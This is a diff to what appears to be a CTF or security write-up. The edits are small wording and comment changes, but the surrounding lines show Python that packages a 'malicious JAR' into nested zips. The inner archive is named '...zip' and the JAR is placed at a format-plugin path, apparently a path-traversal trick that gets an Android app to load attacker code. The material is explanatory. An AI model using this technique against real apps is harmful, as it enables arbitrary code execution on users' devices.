@@ -1041,10 +1041,11 @@ import zipfile
 
 # Create inner zip with the malicious JAR at the right path
 with zipfile.ZipFile('inner.zip', 'w') as z:
-    # Path relative to /cache/zippier/
+    
     with open("ZipFormat_7z_dex.jar", "rb") as jar_file:
         jar_bytes = jar_file.read()
 
+    # Path relative to /cache/zippier/
     z.writestr('formats/net.axolotl.zippier.ZipFormat_7z.jar', jar_bytes)
 
     z.writestr('pwn.7z', b'Trigger exploit')
@@ -1065,7 +1066,7 @@ with zipfile.ZipFile('exploit.zip', 'w') as z:
     z.writestr('...zip', inner_zip_data)
 ```
 
-Basically we first create the inner zip, which consists of the JAR file, which we name `formats/net.axolotl.zippier.ZipFormat_7z.jar`, and a dummy file `pwn.7z` to trigger the exploit
+Basically we first create the inner zip, which consists of the JAR file, named `formats/net.axolotl.zippier.ZipFormat_7z.jar`, and a dummy file named `pwn.7z` to trigger the exploit
 
 The outer zip, named `exploit.zip`, then consists of the inner zip contents above, but of course the inner zip is named `...zip`
 
